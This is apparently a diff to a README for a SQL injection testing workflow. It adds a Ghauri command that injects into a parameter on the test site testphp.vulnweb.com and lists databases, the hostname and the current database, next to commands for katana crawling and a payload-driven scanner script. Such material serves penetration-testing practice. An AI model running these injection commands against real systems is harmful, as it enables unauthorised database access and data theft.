@@ -9,3 +9,9 @@ katana -u http://testphp.vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,al
 ```
 sudo python3 ./lostsec.py -l testphp.vulnweb.com.output.txt -p payloads/xor.txt -t 5
 ```
+
+### Ghauri
+
+```
+ghauri -u "http://testphp.vulnweb.com/artists.php?artist=*" --dbs --batch --confirm --hostname --current-db
+```
